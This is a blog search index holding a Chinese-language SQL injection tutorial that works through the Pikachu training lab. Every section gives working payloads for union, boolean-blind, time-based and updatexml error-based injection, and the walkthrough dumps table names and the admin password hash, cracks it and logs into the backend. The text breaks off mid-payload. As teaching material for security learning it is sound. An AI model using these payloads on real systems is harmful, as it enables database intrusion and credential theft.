<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入笔记</title>
      <link href="/2020/09/07/sql-zhu-ru-bi-ji/"/>
      <url>/2020/09/07/sql-zhu-ru-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p><p>&emsp;&emsp;一般情况下，程序开发者会使用动态SQL语句。动态SQL语句是在执行过程中构造的，它根据不同的条件产生不同的SQL语句，这种创建SQL语句的方式具有很大的灵活性。但动态创建SQL语句时，需要特别注意注入的产生，例如下面的PHP代码：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select username,email from member where id=$id"</span><span class="token punctuation">;</span></code></pre><p>&emsp;&emsp;由于这里的的参数<code>id</code>可控，且带入数据库执行查询操作，所以非法用户可以拼接SQL语句对数据库进行恶意操作。例如当<code>id = -1 union select user(),database()#</code>时，在MySQL中执行的SQL语句如下：</p><pre class=" language-mysql"><code class="language-mysql">select username,email from member where id=-1 union select user(),database()#'</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入语句在MySQL中的直接结果.png" alt="注入语句在MySQL中的直接结果"></center><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>&emsp;&emsp;SQL注入漏洞的产生需要满足以下两个条件：</p><ul><li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li><li>参数参与数据库操作：传入的参数直接拼接到SQL语句后，带入数据库进行相关操作。</li></ul><h1 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h1><ol><li><strong>注入点判断</strong>。不同类别的网站注入点存在的位置也可能不一样，但其都有脱离不了一点就是与数据库进行交互，所以与数据库发生交互操作的功能点都有可能存在SQL注入，常出现注入点的位置有：新闻公告等查询处、用户注册处、用户登录处等等。</li><li><strong>判断SQL语句中的列数</strong>。注入点正常实现的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或报错等操作，使得此注入点显示的数据是我们想要得到的，但构造<font color="blue">我们需要的查询时必须要知道原SQL语句中的列数</font>，否则SQL执行时会发生错误。</li><li><strong>判断SQL语句操作的回显位置</strong>。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来，同样使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到这样的一个点。</li><li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到数据库用户名、版本、数据库名称等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li><li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li><li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li><li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li></ol><h1 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h1><p>&emsp;&emsp;在进行SQL注入时，首先需要判断是否存在注入点，而其利用的原理是使<strong>SQL语句在执行时发生语法错误</strong>或<strong>SQL语句的执行结果为空使其代码逻辑发生错误</strong>，通常通过以下几种方式来判断是否存在注入点(<font color="blue">成功一定存在，不成功可能存在</font>)：</p><h2 id="单引号判断"><a href="#单引号判断" class="headerlink" title="单引号判断"></a>单引号判断</h2><p>&emsp;&emsp;单引号判断注入点是否存在利用的是SQL语句在执行时发生语法错误。在SQL语法中<code>&#39;</code>必须成对存在否则在语句执行时会报语法错误，语句不能正常执行。下图是MySQL中的执行情况。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-单引号引起的报错(MySQL).png" alt="注入点判断-单引号引起的报错(MySQL)"></center><p>当<code>&#39;</code>从前端传入时，应用程序执行结果为：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-单引号注入(Response错误).png" alt="注入点判断-单引号注入(Response错误)"></center><p>而正常输入参数时应答报文如下所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-单引号(正常Response).png" alt="注入点判断-单引号(正常Response)"></center><p>根据返回的报文结果可知，该点存在SQL注入。</p><p>&emsp;&emsp;<font color="red">此种方式判断注入点最是简单，也是最通用的，其主要依赖于单引号(<code>&#39;</code>)，若单引号被程序过滤或转义则这种方式将毫无用武之地</font>。</p><h2 id="Bool判断"><a href="#Bool判断" class="headerlink" title="Bool判断"></a>Bool判断</h2><p>&emsp;&emsp;Bool判断注入点是否存在利用的是SQL语句的执行结果为空使其代码发生逻辑错误。SQL语句操作时常常用<code>where</code>条件来限定操作的记录，<code>where</code>条件恒真或恒假时，返回报文是不同的。</p><p>当<code>id=8 and 1=1</code>时，<code>where</code>条件恒真，返回页面如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-Bool判断(Responnse正常).png" alt="注入点判断-Bool判断(Responnse正常)"></center><p>当<code>id=8 and 1=2</code>时，<code>where</code>条件恒假，返回页面如下所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-Bool判断(Response错误).png" alt="注入点判断-Bool判断(Response错误)"></center><p>​        此种方式判断注入点依赖于where条件和SQL语句执行结果(0或1)，不同的执行结果将在前端展示不同效果，所以此方式<font color="red">适用于SQL执行结果有两种或多种展示的情况</font>(即使<code>&#39;</code>被过滤也不影响该判断方式)。但是若SQL的执行结果只有一种回显，则此法也将失效。</p><h2 id="Time判断"><a href="#Time判断" class="headerlink" title="Time判断"></a>Time判断</h2><p>​        Time判断注入点是否存在适用于SQL执行结果只有一种回显，但没有过滤<code>slee()</code>函数的情况，利用消息的返回时间判断是否存在注入点。正常消息的反应时间较短，而执行了<code>sleep()</code>函数后消息的反应时间相对较长。</p><p>当<code>id = 1</code>时，消息返回时间较短，具体数据如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-Time判断(正常返回).png" alt="注入点判断-Time判断(正常返回)"></center><p>当<code>id = 1 and sleep(5)</code>时，消息的返回时间较长，与正常返回时间相差5秒左右。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入点判断-Time判断(sleep).png" alt="注入点判断-Time判断(sleep)"></center><h1 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h1><p>​        <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong>。以<code>pikachu</code>平台的数据库为例，输入<code>select id，email from member where username=&#39;vince&#39; union select username,pw from member where id=1;</code>查询结果如下：</p><pre class=" language-mysql"><code class="language-mysql">+-------+----------------------------------+| id    | email                            |+-------+----------------------------------+| 1     | vince@pikachu.com                || vince | e10adc3949ba59abbe56e057f20f883e |+-------+----------------------------------+2 rows in set (0.00 sec)</code></pre><p>​        返回<code>pikachu</code>平台，在搜索型注入中，输入如下payload，出现如下报错。</p><p><code>v&#39; union select username,pw from member where id=1#%</code></p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/直接在浏览中使用union查询时出现错误.png"><p>​        出现上述报错的原因是<strong>union查询的字段不能超过主查询的字段数</strong>，这个时候可以在SQL语句后面加<strong><code>order by</code>子句</strong>，以此来判断主查询的字段数。</p><p><strong>使用<code>order by</code>子句来判断主查询中字段的个数</strong>：</p><ul><li>输入<code>v&#39; order by 4#%</code>，反馈如下图所示：</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/union注入使用orderby子句判断主查询字段数.png"><ul><li>输入<code>v&#39; order by 3#%</code>，反馈如下图所示：</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/union注入使用orderby主句判断主查询字段个数2.png"><ul><li>由以上操作判断出<strong>主查询有三个字段</strong>。</li></ul><p><strong>使用<code>union select</code>联合查询获取数据库指纹信息</strong>：</p><ul><li>之后我们来使用<code>union</code>来做一个SQL语句的拼接。构造payload：<code>v&#39; union select database(),user(),version()#%</code>，反馈结果如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/union注入查询数据库名称用户名版本信息.png"><ul><li>由上述操作我们得知数据库的版本是<code>5.5.53&gt;5.0</code>存在<code>information_schema</code>数据库。</li></ul><p><strong>union select联合查询结合<code>information_schema</code>查询网站所有库名</strong>:</p><ul><li>构造payload:<code>v&#39;union select table_schema,2,3 from information_schema.tables -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入获取所有库名称.png" alt="union注入获取所有库名称"></center><p><strong>union select联合查询结合<code>information_schema</code>查询<code>pikachu</code>数据库中的数据表</strong>:-</p><ul><li>构造payload：<code>v&#39;union select (select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1),2,3  -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-查询pikachu库中的表名.png" alt="union注入-查询pikachu库中的表名"></center><ul><li>此条payload使用<code>limit</code>将查询结果限制为一条，可以通过修改<code>limit</code>的参数来回显出用户数据表名。如：<code>v&#39;union select (select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 3,1),2,3  -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-查询pikachu库的user表.png" alt="union注入-查询pikachu库的user表"></center><p><strong>union select联合查询结合<code>information_schema</code>查询<code>pikachu</code>数据库中的<code>users</code>数据表的字段名</strong>:</p><ul><li>构造payload：<code>v&#39;union select (select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 0,1),2,3  -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-pikachu库users表字段查询.png" alt="union注入-pikachu库users表字段查询"></center><ul><li>此条payload使用<code>limit</code>将查询结果限制为一条，可以通过修改<code>limit</code>的参数来回显出用户名、密码等敏感信息。如：<code>v&#39;union select (select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 1,1),(select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 2,1),3  -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-pikachu库users表username和password.png" alt="union注入-pikachu库users表username和password"></center><p><strong>union select联合查询结合<code>information_schema</code>查询<code>pikachu</code>数据库中的<code>users</code>数据表中<code>username</code>和<code>password</code>的值</strong>:</p><ul><li>构造payload：<code>v&#39;union select username,password,3 from users limit 0,1 -- &#39;</code>，回显结果如下图所示。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-pikachu库users表username和password字段值.png" alt="union注入-pikachu库users表username和password字段值"></center><p><strong>尝试爆破MD5</strong>:</p><ul><li>使用<a href="https://cmd5.com/" target="_blank" rel="noopener">在线md5</a>爆破得到<code>admin</code>用户密码为：<code>123456</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-爆破得到admin用户密码.png" alt="union注入-爆破得到admin用户密码"></center><p><strong>尝试使用爆破的账号和密码登录后台</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-union爆破登录后台.png" alt="union注入-union爆破登录后台"></center><h1 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h1><p>​        当系统不显示返回信息或当发生错误时将系统重定向到一个通用错误页面，这个上述使用过的SQL注入办法不能再使用。</p><p>​        盲注，即在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，这就需要我们使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p><p>​        <strong>SQL盲注分为三大类</strong>：基于布尔型SQL盲注、基于时间型SQL盲注、基于报错型SQL盲注</p><p><strong>实战测试</strong>：    </p><ol><li><p><strong>爆数据库名称长度</strong></p><p>在检测数据库名称长度时，因为错误回显信息被屏蔽，但其发生错误时还是会有明显得特征，因此使用<code>length()</code>结合逻辑运算来判断数据库名称的长度值。</p><p>payload：<code>vince&#39; and length(database()) &lt; 3#</code>，其中<code>3</code>要不断变化以此来逼近数据库名称长度值。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/Boolean盲注爆数据库名称长度.png"><p>解析：</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/boolean盲注解析.png"><p>拼接SQL语句为：</p><pre class=" language-mysql"><code class="language-mysql"># 爆数据库名称长度select id,email from member where username='vince' and length(database()) < 3#'</code></pre></li></ol><ol start="2"><li><p><strong>爆数据库名称</strong>（<font color="blue">一个字母一个字母得爆</font>）</p><p>获取数据库名称长度后，使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数来逐个字母判断数据库的名称，可构造payload：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and substr(database(),1,1)='p'## 匹配字符的ASCIIvince' and ascii(substr(database(),1,1))=112#</code></pre><p>操作结果如下所示。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/boolean盲注爆数据库名称.png"><p>以此类推继续爆数据库名称为：<code>pikachu</code>。</p><p><strong>解析</strong>：</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/boolean盲注解析.png"><p>拼接SQL语句为：</p><pre class=" language-mysql"><code class="language-mysql"># 爆数据库名称select id,email from member where username='vince' and ascii(substr(database(),1,1))=112#'</code></pre></li><li><p><strong>爆数据表名称</strong></p><p>由以上操作得到数据库名称<code>pikachu</code>后，还要继续使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数结合<code>union select</code>来爆数据表的名称信息。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1)='p'## 匹配字符的ASCIIvince' and ascii(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1))=112#vince' and ord(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1))=112#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Boolean注入-爆数据表名称首字母h.png" alt="Boolean注入-爆数据表名称首字母h"></center><p>以此类推爆破得到表名为：<code>httpinfo</code>，不是我们想要的数据表，因此需要修改<code>limit</code>参数继续爆破表名。最后在<code>limit 3 1</code>处爆破得到<code>users</code>表。</p></li><li><p><strong>爆users表字段名称</strong></p><p>由以上操作得到数据表名称<code>users</code>后，还要继续使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数结合<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1)='p'## 匹配字符的ASCIIvince' and ascii(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1))=112#vince' and ord(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1))=112#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Boolean注入-爆数据表字段名称.png" alt="Boolean注入-爆数据表字段名称"></center><p>以此类推爆破得到字段名为：<code>id</code>，不是我们在意的数据，因此需要修改<code>limit</code>参数继续爆破字段名。最后在<code>limit 1 1</code>处爆破得到<code>username</code>字段名，在<code>limit 2 1</code>处爆破得到<code>password</code>字段名。</p></li><li><p><strong>爆users表字段值</strong></p><p>由以上操作得知<code>users</code>表存在<code>username</code>和<code>password</code>字段后，还要继续使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数结合<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and substr((select username from users limit 0,1),1,1)='p'## 匹配字符的ASCIIvince' and ascii(substr((select username from users limit 0,1),1,1))=112#vince' and ord(substr((select username from users limit 0,1),1,1))=112#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Boolean注入-爆admin用户名.png" alt="Boolean注入-爆admin用户名"></center><p>以此类推爆破得到用户名为：<code>admin</code>，修改<code>username</code>为<code>password</code>继续爆破得到密码为：<code>e10adc3949ba59abbe56e057f20f883e</code></p></li><li><p><strong>尝试爆破MD5</strong>:</p><p>使用<a href="https://cmd5.com/" target="_blank" rel="noopener">在线md5</a>爆破得到<code>admin</code>用户密码为：<code>123456</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-爆破得到admin用户密码.png" alt="union注入-爆破得到admin用户密码"></center></li><li><p><strong>尝试使用爆破的账号和密码登录后台</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-union爆破登录后台.png" alt="union注入-union爆破登录后台"></center></li></ol><h1 id="Time注入"><a href="#Time注入" class="headerlink" title="Time注入"></a>Time注入</h1><p>​    在某些地方进行<code>boolean</code>盲注失败后，可以使用基于时间的盲注继续进行注入点测试。基于时间的注入会使用到<code>sleep()</code>函数。</p><p>​        在pikachu中的基于时间盲注模块使用payload：<code>vince&#39; and sleep(10)#</code>，进行检测结果如下所示。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/基于时间的注入操作.png"><ol><li><p><strong>爆数据库名称</strong></p><p>输入：<code>vince&#39; and if(substr(database(),1,1)=&#39;p&#39;,sleep(10),null)#</code>，反馈结果如下所示。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/基于时间盲注爆数据库名称.png"><p><strong>解析</strong>：</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/基于时间盲注解析.png"><p>拼接的SQL语句为：</p><pre class=" language-mysql"><code class="language-mysql"># 检测注入点是否存在select id,email from member where username='vince' and sleep(5)#'# 爆数据库名称select id,email from member where username='vince' and if(substr(database(),1,1)='p',sleep(5),null)#'</code></pre><p>以此类推继续爆破得到数据库名为：<code>pikachu</code>，接下来继续爆破数据库中的表名。</p></li><li><p><strong>爆数据表名称</strong></p><p>由以上操作得到数据库名称<code>pikachu</code>后，还要继续使用<code>if</code>判断语句结合<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数以及<code>union select</code>来爆数据表的名称信息。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and if(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1)='p',sleep(5),null)## 匹配字符的ASCIIvince' and if(ascii(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1))=112,sleep(5),null)#vince' and if(ord(substr((select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),1,1))=112,sleep(5),null)#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆httpinfo表名1.png" alt="Time注入-爆httpinfo表名1"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆httpinfo表名2.png" alt="Time注入-爆httpinfo表名2"></center><p>以此类推爆破得到表名为：<code>httpinfo</code>，不是我们想要的数据表，因此需要修改<code>limit</code>参数继续爆破表名。最后在<code>limit 3 1</code>处爆破得到<code>users</code>表。</p></li><li><p><strong>爆users表字段名称</strong></p><p>由以上操作得到数据表名称<code>users</code>后，还要继续使用<code>if</code>判断语句结合<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数以及<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and if(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1)='p',sleep(5),null)## 匹配字符的ASCIIvince' and if(ascii(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1))=112,sleep(5),null)#vince' and if(ord(substr((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 0,1),1,1))=112,sleep(5),null)#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段名称失败.png" alt="Time注入-爆字段名称失败"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段名称成功.png" alt="Time注入-爆字段名称成功"></center><p>以此类推爆破得到字段名为：<code>id</code>，不是我们在意的数据，因此需要修改<code>limit</code>参数继续爆破字段名。最后在<code>limit 1 1</code>处爆破得到<code>username</code>字段名，在<code>limit 2 1</code>处爆破得到<code>password</code>字段名。</p></li><li><p><strong>爆users表字段值</strong></p><p>由以上操作得知<code>users</code>表存在<code>username</code>和<code>password</code>字段后，还要继续使用<code>if</code>判断语句结合<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数以及<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p><pre class=" language-mysql"><code class="language-mysql"># 直接匹配字符vince' and if(substr((select username from users limit 0,1),1,1)='p',sleep(5),null)## 匹配字符的ASCIIvince' and if(ascii(substr((select username from users limit 0,1),1,1))=112,sleep(5),null)#vince' and if(ord(substr((select username from users limit 0,1),1,1))=112,sleep(5),null)#</code></pre><p>操作结果如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段值失败.png" alt="Time注入-爆字段值失败"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段值成功.png" alt="Time注入-爆字段值成功"></center><p>以此类推爆破得到用户名为：<code>admin</code>，修改<code>username</code>为<code>password</code>继续爆破得到密码为：<code>e10adc3949ba59abbe56e057f20f883e</code></p></li><li><p><strong>尝试爆破MD5</strong>:</p><p>使用<a href="https://cmd5.com/" target="_blank" rel="noopener">在线md5</a>爆破得到<code>admin</code>用户密码为：<code>123456</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-爆破得到admin用户密码.png" alt="union注入-爆破得到admin用户密码"></center></li><li><p><strong>尝试使用爆破的账号和密码登录后台</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/union注入-union爆破登录后台.png" alt="union注入-union爆破登录后台"></center></li></ol><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="技巧思路"><a href="#技巧思路" class="headerlink" title="技巧思路"></a>技巧思路</h2><p>​        在MySQL中使用一些指定的函数来制造报错，从而从报错信息中获取设定的信息，常见的<code>select/insert/update/delete</code>注入都可以使用报错方式来获取信息。</p><h2 id="背景条件"><a href="#背景条件" class="headerlink" title="背景条件"></a>背景条件</h2><p>​        后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。</p><h2 id="三个常用的用来报错的函数"><a href="#三个常用的用来报错的函数" class="headerlink" title="三个常用的用来报错的函数"></a>三个常用的用来报错的函数</h2><ul><li><code>updatexml()</code>：函数是MySQL对XML文档数据进行查询和修改的XPATH函数。</li><li><code>extractvalue()</code>：函数也是MySQL对XML文档函数进行查询和修改的XPATH函数。</li><li><code>floor()</code>：是MySQL中用来取整的函数。</li></ul><h2 id="基于报错的信息获取"><a href="#基于报错的信息获取" class="headerlink" title="基于报错的信息获取"></a>基于报错的信息获取</h2><p><code>updatexml(XML_document,XPath_string,new_value)</code>;</p><ul><li><code>XML_document</code>是<code>String</code>格式，为XML文档对象的名称。</li><li><code>XPath_string</code>XPath格式的字符串。</li><li><code>new_value</code>String格式，替换查找到的符合条件的数据。</li></ul><h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p><strong>环境</strong>：piakchu搜索型注入</p><ol><li><p>使用<code>updatexml()</code>爆数据库版本信息</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据库版本信息.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#</code><ul><li>x:任意值</li></ul></li></ul></li></ol><ol start="2"><li><p>使用<code>updatexml()</code>爆数据库当前用户</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据库当前用户信息.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)#</code><ul><li>x:任意值</li></ul></li></ul></li></ol><ol start="3"><li><p>使用<code>updatexml()</code>爆数据库名称</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取当前数据库名称.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code><ul><li>x:任意值</li></ul></li></ul></li></ol><ol start="4"><li><p>使用<code>updatexml()</code>爆数据库中的表名</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 3,1),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据表名称.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 3,1),0x7e),1)#</code><ul><li>x:任意值</li><li>3:取第四行数据</li></ul></li></ul></li></ol><ol start="5"><li><p>使用<code>updatexml()</code>爆数据表中的字段名</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据表中的字段名.png"><ul><li>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),0x7e),1)#</code><ul><li>x:任意值</li><li>2:取第三行数据</li></ul></li></ul></li></ol><ol start="6"><li><p>使用<code>updatexml()</code>爆数据表中的字段值</p><ul><li>输入：<code>x&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#</code>，反馈如下图所示。</li></ul><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取数据表中的字段值.png"><ul><li><p>payload：<code>x&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#</code></p><ul><li>x:任意值</li></ul></li><li><p>但此payload不能完整地将超过31位的字段值展示出来，需要做以下改进。</p></li><li><p>输入：<code>x&#39; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),1,16),0x7e),1)#</code>，先获取password字段值的前16位。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取password字段值前16位.png"></li><li><p>输入：<code>x&#39; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),17,16),0x7e),1)#</code>，再获取password字段值的后16位。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入获取password字段值后16位.png"></li><li><p>拼接起来的password字段值为：<code>e10adc3949ba59abbe56e057f20f883e</code>，爆破出来的值为：<code>123456</code>。</p></li></ul></li></ol><ul><li><p>扩展：username、password字段值同时显示</p><ul><li><p>输入：<code>x&#39; and updatexml(0x7e,concat(0x7e,((select 